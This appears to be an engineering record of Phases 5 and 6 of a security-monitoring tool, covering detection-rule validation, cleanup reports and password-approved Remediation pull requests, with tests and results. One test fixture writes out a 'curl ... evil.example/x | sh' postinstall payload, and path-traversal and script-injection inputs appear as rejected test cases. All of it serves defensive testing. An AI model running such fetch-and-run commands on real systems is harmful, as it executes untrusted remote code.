| Brief 5: the cleanup report checked by application code, shown and never sent | the cleanup report row above |
| Brief 6: the Finding page shows the static Proof and the cleanup report as escaped text, with no Lab | UI `Findings` "shows the static Proof with each validation check and the cleanup report as text" (a `<script>` rule and indicator render as text), "names the failed Detection rule check and keeps the artifacts Draft", "offers no Lab and no generation for a Malicious change Finding" |
| Brief 7: runtime and backend tests, FixtureBroker only, docs | the rows above; `runner/README.md` (Detection rules), `docs/implementation-contract.md` (the `detection_rule` kind, the Analysis output, the validation, `malicious_change`, `static_proof` and `cleanup_report`, the `generation_not_available` refusal) and this section |

Deviations from the plan, PRD and ADRs:
- **Hashes computed by application code.** The PRD's extracted indicators include hashes. The agent drafts none (the schema refuses a `hashes` field); application code hashes each file it keeps from the commit's snapshot.
- **Indicators must be literal.** A file is kept only if commit.json lists it as added or changed, and a host, URL or command only if it occurs literally in a line the diff adds. An encoded or obfuscated value, or one in the uncaptured part of an incomplete diff, is listed as rejected with its reason, not kept.
- **Snapshot bounds.** Snapshots omit binary media and hold up to 65,536 files, 64 MiB per file and 512 MiB in all (`artifacts.MAX_SOURCE_FILES`, `MAX_FILE`, `MAX_SET`), so a payload hidden in an image or font, or in a repository over the bounds, can never satisfy the `changed` check, and its Finding stays Draft. The `parent` and `baseline` checks scan the same snapshots, so they cover no media file and not the repository's own root `manifest.json` (the snapshot's artifact manifest takes that path and is never sent): a rule that would match only those files on the server still passes.
- **No prose `cleanup-report.md`.** The cleanup report is structured data on the Finding (`static_proof.indicators` and `cleanup_report`). The agent drafts only the indicators and `reachable_secrets`; application code adds the commits, the releases and the Detection rule, and the UI renders them.
- **Generation refused.** Lab bundle generation does not apply to a static Proof, so `artifact-generations` refuses a Malicious change Finding with 409 `generation_not_available`; it is re-drafted by analysing the commit again or uploading a corrected `detection-rule.yar`.
- **Approximate containment.** The commits that contained the change are the later stored commits on the same branch by `committed_at`, plus the Baseline for a Backfill commit, and the releases are the tags pointing at those. Tags on unwatched branches, backports and later reverts are missed. Phase 7's tag containment replaces this (marked `ponytail:` in `detection.containing_commits`).
- **Release-branch Baseline.** A commit on a Release branch is checked against the repository's default-branch `baseline_revision`, because a watched branch stores no Baseline revision of its own.
- **Validation per Finding.** Validation runs once per Finding revision, so a shared Upstream commit in N Applications runs N identical yara jobs; the parent and Baseline snapshots are stored once.
- **Done-when on the real Engine.** No single test runs the backend and the real Engine together, and the journey has no agent, so it cannot produce a Malicious change Verdict. As in Phase 4, the Done-when row names the two pieces that prove it on one fixture: the backend `FixtureBroker` test and the runtime test.
- **Failed validation jobs.** A validation job that fails (broker down, a snapshot fetch error) leaves `static_proof.status` `pending` with its job link and no failed check; the Operator retries the job.
- **Customized templates.** An Operator-customized `commit_analysis` template lacks the new `detection-rule` include. The appended result schema still names the fields, but such runs may fail `invalid_agent_output` until the template is reset; `GET /prompts` already flags `default_changed`, and no migration resets it.
- **Open for Phase 7.** Upstream static Proofs stay downloadable until A15's Upstream download refusal. The Findings list still shows "Lab unverified" on a Malicious change row, because the summary view carries no `malicious_change`. A Lab for another Finding is not refused when its tree contains a known Malicious change, such as an Own-repository Proof at a later commit or an Upstream version that shipped it: install scripts stay disabled, but a payload in runtime code (a required module, `server.js`) would run during that Lab's run phase. Refusing it needs Phase 7's tag containment.
- **No migration.** `static_proof` and `cleanup_report` live in `findings.data` (JSON), and job kinds are strings.

**Stale-reference sweep.** `git grep --untracked -n -i "cleanup-report.md\|stay with the Analysis\|until Phase 5\|gets no bundle"` over `backend`, `frontend`, `runner`, `tests`, `README.md` and `docs/implementation-contract.md` leaves two hits, both deliberate:
- `backend/tests/test_prompts.py`: `test_the_detection_rule_section_describes_validation_and_the_cleanup_report` asserts that the commit Analysis prompt no longer asks for `cleanup-report.md`;
- `docs/implementation-contract.md`'s Phase 5 verified-adjustment bullet, which records that the cleanup report is not a drafted `cleanup-report.md`.

A broader sweep for "Malicious change" in the backend, frontend and runner sources and the README found README step 5's "keeps its drafted Detection rule and cleanup report with the analysis", already replaced in T2, and step 7, which named only a reproduced Lab Proof as what confirms a Finding, fixed above. Phase 3's "Its drafts stay with the Analysis" in this file records what was verified then and is left as it is.

**Outside traffic.** No paid inference was made, and no request reached a real Asset, GitHub, Discord, a package registry or `herdr.dev`. The agent is `FixtureBroker` in every backend test, and its fake yara answers the `detection_rule` run. `Sources.github_tags` refuses before any request without a GitHub account, which these tests do not add (the releases are then unknown), and the tests that list releases monkeypatch it; the read-only fetch test monkeypatches `Sources.snapshot_github`. The runtime tests scan local fixture trees with `network_mode none`. Numen's pre-existing gateway runtime test still opens one credential-free TCP tunnel to `api.openai.com:443` to prove that a provider host is allowed. It sends no TLS handshake and no request.

On Docker Desktop (Engine 20.10, 8 GB), after T5's doc changes, in this order:

| Command | Result |
|---|---|
| `make build` | passed; the probe image installed `yara=4.2.3-4` and `yara --version` ran at build |
| `make check` | passed (ruff "All checks passed!", eslint, tsc, vite build; only Vite's existing chunk-size warning) |
| `make test-unit` | backend 240 passed; runner 136 passed, 66 skipped (the Engine tests, which `make test-runtime` runs) |
| `make test-integration` | 399 passed against PostgreSQL, `test_detection_rules.py` and `test_postgres_cleanup_report_orders_the_containing_commits_by_json_path` included |
| `make test-runtime` | 201 passed, 1 skipped: `test_a_detection_rule_scan_error_fails_the_run` is skipped there because that container runs as root, which reads a mode-0 file; it runs and passes in `make test-unit`'s runner suite |
| `vitest run --maxWorkers=2` (frontend-tests) | 127 passed in 19 files |
| `make test-journey` | passed (all 9 PASS lines, JOURNEY PASSED). The journey has no agent, so it does not reach a Malicious change; see the Done-when row. The `asset-monitor-test` stack was then stopped with its volumes kept, and no runtime-tests container, Lab image or job network remains |

T1–T4 each ran the suites for their own area first; T4 wrote its frontend tests first and saw 4 of 36 fail before the panels existed.

Review fixes:
- **Indicator bounds no longer fail the Verdict.** The result schema's `indicators` and `reachable_secrets` lost their count and length bounds (100 items, 240 to 2000 characters, 50 secrets of 300), so a long obfuscated postinstall one-liner or a change adding many files can no longer fail a Malicious change Analysis. `check_indicators` rejects an empty value, which every line would contain, and the cleanup report drops blank secrets. Backend `test_a_malicious_change_must_return_indicators_and_reachable_secrets` accepts 500 files, an 8 KiB command and 60 secrets of 5000 characters.
- **The payload marker is a real detector.** The fixture's `postinstall` is now `touch /workspace/outputs/payload-ran && curl -s https://evil.example/x | sh`; the old `node -e …` could not have run in the probe image, which has no node, so its absent marker proved nothing. The runtime test also runs that payload with `sh` in the probe image (no network, a tmpfs at `/workspace/outputs`) and sees the marker appear. The backend copy changed with it, and its always-true check for a `payload-ran` artifact was removed.
- **Generation is refused when it runs.** `Workflows.finding_artifacts` refuses a Malicious change Finding with 409 `generation_not_available` before its agent runs, as `lab_run` does, so a generation queued before a later Verdict can no longer replace the static Proof (`test_generation_is_refused_for_a_malicious_change_finding`).
- **The static Proof path follows `malicious_change`.** `set_finding_artifacts` takes the static Proof path for a commit's Finding that `malicious_change` names even without a stored `static_proof`, starting one, so an uploaded rule on a Malicious change Finding opened before Phase 5 is validated (`test_a_finding_opened_by_a_malicious_change_before_phase_5_starts_a_static_proof_on_upload`). A served-content Finding keeps the Lab bundle path until Phase 9. A later Verdict on a Finding that a Malicious change opened no longer publishes a Lab bundle over its static Proof, because the Finding stays a Malicious change Finding; one a Malicious change did not open still gets the later Verdict's bundle (`test_a_later_verdict_replaces_the_static_proof_of_a_finding_a_malicious_change_did_not_open`). A Malicious change Finding opened before Phase 5 with no revision since still shows the Lab completeness state until its first upload.
- **Releases are never read as none.** An empty `releases` list shows "None found among the stored commits; not ruled out" (UI "never shows releases none of the stored commits had as none"); `null` still shows Unknown.
- **Docs.** The snapshot bounds are 65,536 files, 64 MiB per file and 512 MiB in all, corrected in this section and in `docs/implementation-contract.md` (lines 111, 128 and 129; the earlier phases' records above keep their figure). The deviations now say that the `parent` and `baseline` checks cover no media file and not the root `manifest.json`, and record for Phase 7 that a Lab for another Finding whose tree contains a known Malicious change is not refused.

After the review fixes, on the same Engine:

| Command | Result |
|---|---|
| `make build` | passed |
| `make check` | passed (ruff "All checks passed!", eslint, tsc, vite build; only Vite's existing chunk-size warning) |
| `make test-unit` | backend 242 passed; runner 136 passed, 66 skipped |
| `make test-integration` | 401 passed against PostgreSQL |
| `make test-runtime` | 201 passed, 1 skipped (`test_a_detection_rule_scan_error_fails_the_run`, as above) |
| `make test-ui` | 128 passed in 19 files |
| `make test-journey` | passed (all 9 PASS lines, JOURNEY PASSED); the `asset-monitor-test` stack was then stopped with its volumes kept |

## Phase 6: Remediation PRs (2026-11-14)

Phase 6 (A08, the Remediation PR cells of A06's Own column, the A15 Approval of every Remediation PR, PRD decision 7). This section records each task as it lands.

What each task changed:
- **T1, the write token, the Remediation PR record and the diff mechanics.**
  - Account provider `github_write` (decision 7): a fine-grained token (Contents and Pull requests: read and write; Own repositories only), stored like the read token, vault-encrypted as `{"api_key": ...}` and shown only as `credential_configured`. Native login is refused for it. Its connection check sends `GET {github}/user` with it. `Workflows.source_client` and `domain.schedule` still read provider `github` only, so the write token never polls: with only a write token a GitHub repository keeps `github_token_required`. `all_secrets()` already returns every Account credential, so the token is refused in agent inputs (`secret_in_input`) and redacted from Transcripts and job errors. `sources.github_write_token_required()` is the PR step's error (422). Settings → Integrations lists "GitHub write token (Remediation PRs)".
  - Table `remediation_prs` (model `RemediationPR`, migration `b19c0dd5e4f9`): `application_id`, `finding_id`, `repository_id` (the Own repository), `subject` (the Commit's id; a vulnerability in Phase 8), `action` (`patch`, `revert`, `pin`, `bump`), `status` (default `drafting`), `base_ref`, `diff`, `diff_sha256`, `data`, timestamps, unique on (`application_id`, `subject`, `action`), ADR-0004's idempotency key. No existing data moves. Deleting a Finding deletes its Remediation PRs.
  - New module `backend/numen/remediation.py`, application code with no network; git runs in a temporary checkout with `GIT_CONFIG_NOSYSTEM=1`, `GIT_CONFIG_GLOBAL=/dev/null`, `HOME` in the temporary directory, `core.hooksPath=/dev/null` and a 60 s timeout. `apply_diff(diff, files, workflows, prefix)` raises `diff_rejected` (422) naming the check for an empty, over-1-MiB or non-UTF-8 diff; a rename or copy (from `git apply --summary`; `--numstat` lists only a rename's target, so its source could not be checked); a path from `git apply --numstat -z` that fails `schemas.safe_path`, has a `.git` component (any case), lies outside `prefix` (the repository's `source_path`) or changes `.github/workflows/` without `workflows=True` (which flags it); a diff that does not apply (`git apply` in a checkout of the snapshot's regular files, `manifest.json` left out); and any path that is a symlink or submodule after applying. That last check replaces a mode-line pattern, because git reads `new file mode 120755` as a symlink. It returns the changed and deleted files. `tree_diff(before, after)` is git's binary-safe diff with no renames between two file maps (`add -A -f`, so a tracked file matching `.gitignore` is kept), used for a revert. `dependency_files` edits `package.json` (and `package-lock.json`: the root spec, `node_modules/<name>` and v1 `dependencies[name]`, with `resolved` and `integrity` from the npm dist or dropped without one) or `composer.json` for a pin (exact) or a bump (keeping `^`, `~` or `>=`), and raises `dependency_not_found` for a package that is not a direct dependency. Only the package's own lock entry is rewritten.
  - Tests: `tests/test_remediation.py` (unique key; 18 rejected diffs; changed and deleted files; a revert restoring the parent tree with a binary and an ignored file; npm and composer pin and bump), `tests/test_accounts.py::test_the_github_write_token_is_write_only_and_never_polls`, `tests/test_postgres.py::test_postgres_migration_adds_remediation_prs` (upgrade, `alembic check`, the duplicate refused, downgrade and upgrade again).
- **T2, drafting: the automatic patch, the Cure's revert and pin/bump drafts.**
  - Agent operation `patch_drafting` (backend `schemas.OPERATIONS`, runner `contracts.OPERATIONS`, prompt template `operations/patch_drafting.md` including `rules`, Settings → Defaults "Patch drafting"). Its tools are Analysis' fixed profile (Pi `numen_read,numen_list,numen_write` with `--no-builtin-tools`; Claude `Read,Grep,Glob,Write,Edit`, `--restricted`, edits only under `//workspace/outputs/**`; no `--allowedTools`, no shell). Codex is refused in `resolve_profile` (`patch_codex_unsupported`), `RunRequest` and `agent_argv`, because its sandbox keeps a shell that can write anywhere in `/workspace`. The "scratch worktree" is the run's write-only `outputs/`; the Own checkout is read-only input.
  - `domain.over_cap` is `start_analysis`'s cap counting and once-a-day cap Action and Alert, unchanged in behaviour, now counting `commit_analysis` and `patch_drafting` jobs with `input.automatic`. `domain.draft_remediation` gets or creates the record by its key and queues `patch_drafting` (capped when automatic, `waiting_for_cap` over a cap, started by `start_waiting` after the waiting commits) or `remediation_draft` (application code). Commit Analysis drafts a patch after an Own Vulnerability introduced Verdict and the Cure's revert after an Own Malicious change. `POST /findings/{id}/remediation-prs` drafts a patch or revert by hand (uncapped, like a manual Analysis). `finding_json` adds `own_repository`, `remediation_actions` and `remediation_prs`.
  - `Workflows.patch_drafting` snapshots the Own repository's head and runs the agent with `timeout_seconds` 1200; `remediation_draft` writes a revert (`tree_diff` to the first parent) or a pin/bump (`Sources.npm_version` for the npm dist, which `npm_repository` now reuses). `draft_ready` validates every diff with `apply_diff` against the head (with the repository's `source_path`) and stores git's own diff of the result and its SHA-256 as the `ready` draft. The worker marks a failed draft job's record `draft_failed` with the error; the Finding is untouched. Both kinds are long jobs and, like `lab_run`, skip the source-generation check (their record pins what they act on).
  - Deviations and limits: only an Own Vulnerability introduced Verdict drafts a patch automatically (the A06 Own column gives a Vulnerability fix no Remediation PR); `POST /findings/{id}/remediation-prs` is an addition the PRD does not name; there is no fallback profile, so the demo must set a `patch_drafting` default; a Finding a Malicious change opened gets no patch after a later Vulnerability introduced Verdict; pin/bump targets the manifest at the repository's `source_path` only.
  - Tests: `tests/test_remediation_prs.py` (an Own Vulnerability introduced Verdict queues one automatic run with a 20-minute deadline whose `patch.diff` becomes a ready canonical draft on the default-branch head; five rejected patches (does not apply, `../x`, `/etc/passwd`, `.git/config`, an unflagged workflow) fail the draft with no diff and no GitHub request; caps, waiting and the reset, and an uncapped manual draft; an Own Malicious change's revert with no agent call, flagged for its workflow and applying to the head; no Own repository skips every step and an Upstream commit drafts nothing; a bump editing `package.json` and `package-lock.json` from a fixture registry; the write token in no agent call, and a checkout holding it failing the draft with `secret_in_input`), `tests/test_prompts.py`, runner `tests/test_adapters.py::test_patch_drafting_tools` and `tests/test_contracts.py::test_patch_drafting_refuses_codex`. `tests/test_analysis.py::analyze` now leaves the drafts queued.
- **T3, the Approval and opening the draft pull request.**
  - `POST /findings/{id}/remediation-prs/{remediation_pr_id}/approvals` with `{password, diff_sha256}` (`RemediationApprovalInput`) calls the Lab's `approval()` first (403 `approval_refused`, 429 `approval_rate_limited`), then locks the record. A record that is already `approved`, `open` or `merged` returns its job and queues nothing, so approving twice opens one PR. Anything but `ready` or `failed` is 409 `remediation_not_ready`, a hash that is not the current draft's is 409 `diff_changed`, and a record whose repository is no longer the Application's Own repository is 409 `not_own_repository`. Otherwise it queues one `remediation_pr` job `{remediation_pr_id, finding_id, diff_sha256}` (no profile; `finding_id` blocks Finding deletion while it runs), sets `approved` and `data.job_id`, and records the Action `{action: approved, approved: remediation_pr, remediation, remediation_pr_id, diff_sha256, job_id}` on the Finding.
  - `Workflows.remediation_pr` checks the Own repository and that the record is still `approved` with the job's `diff_sha256` (else `not_own_repository` or `input_changed`). It then applies the stored diff again to the `base_ref` snapshot (`apply_diff`, locally, before any GitHub request). Only then does it take the write token from `Workflows.write_client`, the only place a request is made with it (`github_write_token_required` without one), and call `remediation.open_pull_request`. The title (`Asset Monitor <action> of <short-sha>`), body (the Approval, "never merges", the Finding's dashboard link) and commit message (the title and `Approved diff SHA-256: <hash>`) are fixed application text with no agent output. It sets `open` with `branch`, `pull_number`, `pull_url` and `head_sha`, and records the Action `remediation_pr_opened`.
  - `open_pull_request` refuses a branch outside `asset-monitor/`. If `GET git/ref/heads/<branch>` finds the branch, it reuses its head, but only when that commit's message and parent are this change's; otherwise it fails with 409 `branch_exists` and moves nothing. Without the branch it reads the base commit's tree (`?recursive=1`; `tree_truncated` when GitHub cuts it). It refuses a touched path that is, or sits under, a symlink (120000) or submodule (160000) with `diff_rejected`. It keeps each modified or deleted file's mode, uses 100644 for a new one, and posts one blob per changed file, a tree on `base_tree` (deletions with `sha: null`), a commit whose parent is `base_ref`, and `refs/heads/<branch>`. Then `GET pulls?head=<owner>:<branch>&state=all` reuses an existing pull request, and otherwise it reads the default branch and posts a `draft: true` pull request onto it. Every write goes through `Sources.send`: one request, never retried; 4xx is `github_write_failed` with GitHub's status and message (bounded to 300 characters), 5xx is the same but retryable, and an unreachable GitHub is `github_unavailable`. Nothing merges, PATCHes a ref, writes the default branch or touches another repository.
  - The worker's failure hook sets a failed or cancelled `remediation_pr` job's `approved` record to `failed` with `data.error`; the Finding's status, artifacts, Labs and other drafts are untouched, and the Operator approves again after fixing the cause.
  - Test fixture: `conftest.FakeGitHub` (fixture `github`) is the recorded GitHub API behind `NUMEN_GITHUB_API_URL=http://github.fixture`, routed into every `Sources` client through an httpx `MockTransport`. It holds blobs, trees, commits, refs and pull requests, records `(method, path, bearer token)` for each request, and raises `Crash` (a `BaseException`, which the worker does not catch) once after a chosen request, so that request's answer is lost.
  - Tests in `tests/test_remediation_prs.py`: the approved diff becomes exactly one draft PR on `asset-monitor/aaaaaaa-patch` against `main` (parent `base_ref`, the executable mode kept, no other write); approving twice gives one job and one `POST pulls`; a crash after `POST git/refs`, and one after `POST pulls`, recovered through lease expiry and `queue.recover`, end with one ref, one commit and one PR; a branch holding another change is never reused; a path that is a symlink on GitHub is refused with no write; without the write token the step fails visibly with nothing else changed, and approving again after adding it opens the PR; a drafting or `draft_failed` record cannot be approved; a missing or wrong password (also straight after a good Approval) is 403, a stale hash 409, a malformed one 422, another Finding's id 404; only the Own repository receives a PR (at Approval and in the job); the write token authorizes only the PR step's requests and appears in no Job, JobEvent, Action, Transcript, record, `finding_json` or DEBUG log.
  - Deviations: `branch_exists` and `tree_truncated` are additions. Reusing a branch only when its commit names the approved diff's hash keeps "exactly the approved diff" true after a re-draft.
- **T4, merge detection and the Remediation PR journey.**
  - `remediation.pull_state(source, repository, number)` reads `GET pulls/{n}` (`state`, `merged`, `merge_commit_sha`). `Workflows.source_check` calls it, before its fence and only when the default-branch poll returned new commits, for each `open` record of the repository, through `write_client`. A failed read is kept as the record's `data.error` and never fails the check. Inside the fence, after `import_commits`, `Workflows.pull_request_state` makes a record whose `merge_commit_sha` is now a Commit of the repository `merged`, records `remediation_pr_merged` and moves the Finding to Remediated with cause `{by: remediation_pr, remediation_pr_id, pull_request, merge_commit}` through `domain.transition_finding`. A closed-unmerged record becomes `closed` and leaves the Finding unchanged. The 304 path is untouched.
  - Fixture GitHub API (`tests/integration/fixture_server.py`, the Compose journey's `NUMEN_GITHUB_API_URL=http://fixtures:8090`): `POST` also rewrites `/repos/numen/fixture-<hex>`. `git/ref` answers only `heads/main` and branches created through the fixture (404 until then). New routes: `GET /repos/numen/fixture` (`default_branch: main`), `git/commits/{sha}` (its tree has the commit's sha), `git/trees/{sha}` (the archive's files, mode 100644), `pulls` (`head` filter) and `pulls/{n}`; stateful `POST git/blobs`, `git/trees`, `git/commits`, `git/refs` (a write to `heads/main` is refused) and `pulls`. `/admin/state` adds `pulls` and `writes` (method and path, never a header value), and `/admin/reset` clears them. `conftest.FakeGitHub` gained the default branch's commit list, compare and commit detail (`push()`), and `GET pulls/{n}`.
  - Journey, after the Lab step: a `github_write` account, an Application whose Own repository is a new `numen/fixture-<hex>`, Check now (Baseline `bbbbbbb`) and Backfill 1, a commit Finding, and a revert draft whose diff restores `VERSION` 1.2.0. A wrong password gets 403 `approval_refused` and the fixture records no write. A good one opens the draft pull request `asset-monitor/bbbbbbb-revert` against `main`, and a second Approval returns the same job. The fixture holds exactly one pull request, every write went to the Own repository, and the write token is in no job, job result or job event of that Application.
  - Tests in `tests/test_remediation_prs.py`: `test_a_merged_remediation_pr_remediates_its_finding[merge|squash]` (a merged pull request whose merge commit no poll has imported changes nothing; the poll that imports the merge commit over the PR's head commit, or the squash commit, makes the record `merged` and the Finding Remediated with that cause; a merged record is not read again); `test_a_closed_pull_request_changes_nothing` (without the write token the poll succeeds and the record keeps `github_write_token_required`; closed unmerged, the record is `closed` with the Finding's status, cause and history unchanged; no poll writes to GitHub).
  - Deviation: the merge check reads pull requests with the write token, because a fine-grained read token (Contents and Metadata) cannot read pull requests on a private repository. The token is still decrypted only in `Workflows.write_client`.
- **T5, the Approval screen on the Finding page, and the docs.**
  - `types.ts` adds `remediationPRSchema` (`id`, `action` `patch|revert|pin|bump`, `status`, `base_ref`, `branch`, `diff`, `diff_sha256`, `paths`, `flags`, `summary`, `error`, `job_id`, `pull_number`, `pull_url`, `merge_commit_sha`, timestamps) and the Finding's `own_repository` (default false), `remediation_actions` and `remediation_prs` (default []).
  - `Findings.tsx`: `LabApproval` is replaced by one `Approval` dialog (`title`, `description`, `path`, `body`, `success`, `icon`; the same password field, `queueJob` and `ErrorNote`), used by Start Lab and by Remediation PRs. A new Remediation PRs panel shows each record's action, status, summary, error (a failed draft, PR step or pull-request read), a warning for the `workflows` flag, base revision, branch, a link to `pull_url` (only `http(s)`, `target=_blank`, `rel=noreferrer`) and the diff as React text through the existing `DiffView` (`<pre>`, no `dangerouslySetInnerHTML`) with its full SHA-256. Approve, on a `ready` or `failed` record, posts `{password, diff_sha256}` to the approvals route and names the SHA-256 in the dialog; a refusal (403 `approval_refused`, 409 `diff_changed`, `remediation_not_ready`) keeps the dialog open with the message. Draft patch and Draft revert post `{action}` for `remediation_actions`, disabled while that action's record is drafting, approved, open, merged or closed. Without an Own repository the panel reads "No Own repository: Remediation PR steps are skipped." and offers no buttons. The history shows Approved · Remediation PR (action and diff SHA-256), Remediation PR opened (branch) and Remediation PR merged (merge commit), beside Approved · Lab.
  - `jobSummary.ts`: `patch_drafting` and `remediation_draft` read "<Action> drafted: ready for Approval" (or "Drafted; a later draft replaced it") with the hash, `remediation_pr` reads "Opened draft pull request #n" with its branch. `github_write_token_required` hints "Add a GitHub write token under Settings → Integrations, then approve again." with an Open integrations link. A failed `remediation_pr` gets no "retrying should work" fact and the hint "A Remediation PR is not retried: fix the cause, then approve it again from its Finding."; a failed draft job "A draft is not retried: fix the cause, then draft it again from its Finding."
  - Fix to T2 and T3: `POST /jobs/{id}/retry` re-ran a failed draft job, whose result `draft_ready` then discarded (its record was no longer `drafting`), so a retried `patch_drafting` spent a paid run for nothing; a retried `remediation_pr` could only fail with `input_changed`. The route now refuses `remediation_pr` with `approval_required` and `patch_drafting` or `remediation_draft` with `job_not_retryable`, and the Jobs page offers no Retry for them (backend `test_without_the_write_token_the_pr_step_fails_visibly`, `test_a_failed_draft_cannot_be_approved`; UI `Jobs` "offers no Retry for a failed Lab or Remediation PR: each needs a new Approval").
  - Docs: README step 7 (the Remediation PRs panel as the Approval screen), `docs/implementation-contract.md` (the retry rule, the panel, and a verified-adjustment bullet with the phase's deviations), and this section. `runner/README.md` already had T2's `patch_drafting` paragraph and needed no change.
  - Tests first: the four new `Findings` tests and the three new `Jobs` cases failed against the pre-T5 `Findings.tsx`, `Jobs.tsx` and `jobSummary.ts` (7 failed, 36 passed), then passed.

Acceptance tests, all passing in the runs below:

| Criterion | Tests |
|---|---|
| AC-A08: approving twice, or recovering a crashed job, opens at most one PR per (Application, subject, action) | backend `test_approving_twice_opens_one_pull_request`, `test_a_recovered_job_reuses_the_branch_and_pull_request[after-ref]`, `[after-pull]`, `test_a_branch_holding_another_change_is_never_reused`, `test_the_application_subject_action_key_is_unique`; integration `test_postgres_migration_adds_remediation_prs` (the duplicate key refused on PostgreSQL); journey "PASS Remediation PR Approval refuses a wrong password, then opens exactly one draft pull request on the Own repository" (a second Approval returns the same job; the fixture holds one pull request) |
| AC-A08: a diff that does not apply, or touches files outside the Own repository checkout, is rejected before any GitHub call | backend `test_apply_diff_rejects` (18 cases), `test_a_rejected_patch_is_a_failed_draft_before_any_github_call` (does not apply, `../x`, `/etc/passwd`, `.git/config`, an unflagged workflow: `draft_failed`, no diff, no GitHub request), `test_a_failed_draft_cannot_be_approved`, `test_a_path_that_is_a_symlink_on_github_is_refused` (no write) |
| AC-A08: with the write token missing, the step fails visibly and the rest of the Finding is unaffected | backend `test_without_the_write_token_the_pr_step_fails_visibly` (the record `failed` with `github_write_token_required`; status, artifacts, Labs and the other draft unchanged; no GitHub request; approving again after adding the token opens the PR), `test_a_closed_pull_request_changes_nothing` (a merge check without the token keeps the error on the record and the poll succeeds); UI `Findings` "drafts a Remediation PR by hand and shows why a step failed", `Jobs` "explains a remediation_pr failed with github_write_token_required" |
| AC-A08: a merged Remediation PR moves its Finding to Remediated | backend `test_a_merged_remediation_pr_remediates_its_finding[merge]`, `[squash]` (cause `remediation_pr`), `test_a_closed_pull_request_changes_nothing` |
| A08 Drafting: automatic after the Verdict, capped, one-shot, writes only its outputs, a diff | backend `test_an_own_vulnerability_introduced_verdict_drafts_a_patch` (`timeout_seconds` 1200), `test_patch_drafting_counts_against_the_analysis_caps`; runner `test_patch_drafting_tools`, `test_patch_drafting_refuses_codex` |
| A08 Drafting: a revert, pin or bump is application code | backend `test_an_own_malicious_change_drafts_a_revert` (no agent call), `test_a_bump_draft_edits_package_json_and_the_lockfile`, `test_tree_diff_reverts_a_commit`, `test_dependency_files_pins_and_bumps_npm_and_composer` |
| A08 Approval screen: exactly the validated diff, as text, with its hash; Approve with the password | UI `Findings` "shows a draft Remediation PR diff as text with its hash and approves it with the password" (a `<script>alert(1)</script>` diff is the `<pre>`'s exact text, no `script` element, the full SHA-256 in the record and the dialog, `{password, diff_sha256}` posted to the approvals route, an opened PR's `rel=noreferrer` link and no Approve); backend `test_an_approved_draft_opens_a_draft_pull_request_from_exactly_the_approved_diff` |
| A08 Opening: a draft PR on `asset-monitor/<short-sha>-<action>` in the Own repository only; never the default branch, never a merge, never an Upstream repository | backend `test_an_approved_draft_opens_a_draft_pull_request_from_exactly_the_approved_diff`, `test_only_the_own_repository_receives_a_remediation_pr`, `test_branch_names_carry_the_short_sha_and_the_action`; journey (every write went to the Own repository; the fixture refuses a write to `heads/main`) |
| A08 / decision 7: a separate fine-grained token, never in an agent run | backend `test_the_github_write_token_is_write_only_and_never_polls`, `test_the_write_token_never_reaches_a_patch_drafting_run`, `test_the_write_token_appears_only_on_pr_step_requests` (no Job, JobEvent, Action, Transcript, record, `finding_json` or DEBUG log holds it); journey (no job, result or event of that Application holds it) |
| A15: every Remediation PR needs an Approval | backend `test_remediation_approval_needs_the_password_and_the_current_diff` (missing or wrong password 403, also straight after a good Approval; stale hash 409), `test_without_the_write_token_the_pr_step_fails_visibly` (no Retry: `approval_required`); UI `Findings` "a refused Remediation PR Approval keeps the dialog", `Jobs` "offers no Retry for a failed Lab or Remediation PR: each needs a new Approval"; journey (a wrong password gets 403 and no write) |
| A06: without an Own repository the Remediation PR steps show "no Own repository" and are skipped | backend `test_without_an_own_repository_remediation_prs_are_skipped`; UI `Findings` "without an Own repository Remediation PRs are skipped" |
| Lab Approval keeps working through the generic dialog | UI `Findings` "starting a Lab asks for the Operator's password"; journey (the Lab step) |
| Plan Done-when: AC-A08 tested against a recorded GitHub API fixture, a repeated Approval opens one PR, a merged PR remediates its Finding | the AC-A08 rows above: `conftest.FakeGitHub` in-process and `tests/integration/fixture_server.py` in the journey |

Deviations from the plan, PRD and ADRs (all recorded in the tasks above and in `docs/implementation-contract.md`):
- The patch run's "scratch worktree" is its write-only `outputs/`, with the Own checkout as read-only input, and Codex is refused for patch drafting as for Analysis (ADR-0004).
- Only an Own Vulnerability introduced Verdict drafts a patch automatically: the brief's "Vulnerability fix needing a patch" is not triggered, because A06's Own column gives a Vulnerability fix no Remediation PR.
- "Rejected before any GitHub call" is enforced at draft time: a rejected diff never reaches an Approval or a write-token request; drafting may still read snapshots with the read token. The PR step applies the diff again locally before its first GitHub request.
- The merge check reads pull requests with the write token (a fine-grained read token cannot read them on a private repository), and the connection check sends `GET /user` with it, so the write token is not used "only by the application-code PR step" as the brief says; it is still decrypted only in `Workflows.write_client` and the connection check, and never lists commits or snapshots a repository.
- `POST /findings/{id}/remediation-prs` (manual drafting, uncapped like a manual Analysis) is an addition the PRD does not name; it is the retry path for a failed or blocked draft and the journey's way to a draft without a paid run. Job retry of Remediation PR jobs is refused (T5).
- No fallback profile: automatic patch drafting needs a `patch_drafting` default profile with an API-key account, or the draft fails with `profile_required` or `api_key_required`. The Phase 11 demo must set one.
- Pin and bump rewrite only the package's own `package-lock.json` entry; transitive entries, `composer.lock`, `pnpm-lock.yaml` and `yarn.lock` stay as they are, so a composer bump needs `composer update` before it takes effect. Nothing triggers them before Phases 7 and 8.
- Snapshots skip binary media and symlinks and drop a root `manifest.json`, so a revert of a commit that changed one fails with `revert_incomplete` (see the review fixes), and a path under a repository symlink is refused at opening time from the base tree's modes.
- Changing `.github/workflows` needs the token's Workflows permission, and some private-repository plans refuse draft pull requests; both fail visibly on the record with GitHub's message.
- `branch_exists`, `tree_truncated` and `unsafe_branch` are additions. Deleting a Finding deletes its Remediation PR rows and their key; a later draft for the same change still reuses an opened PR, because opening looks it up by branch name first.
- The automatic revert of an Own Malicious change now also runs in tests that drain every job, and patch drafting counts in the caps; the cap counts stay unlocked (the existing `ponytail:` ceiling).

**Outside traffic.** No paid inference was made and no request reached github.com, a real Asset, a registry, Discord or `herdr.dev`. Every GitHub call in the backend tests goes to `conftest.FakeGitHub` behind `NUMEN_GITHUB_API_URL=http://github.fixture`, the journey's to `tests/integration/fixture_server.py`, and agent drafts come from `FixtureBroker`; the UI tests stub `fetch`.

| Command | Result |
|---|---|
| `make build` | passed |
| `make check` | passed (ruff "All checks passed!", eslint, tsc, vite build; only Vite's existing chunk-size warning) |
| `make test-unit` | backend 243 passed; runner 138 passed, 66 skipped (the Engine tests, which `make test-runtime` runs) |
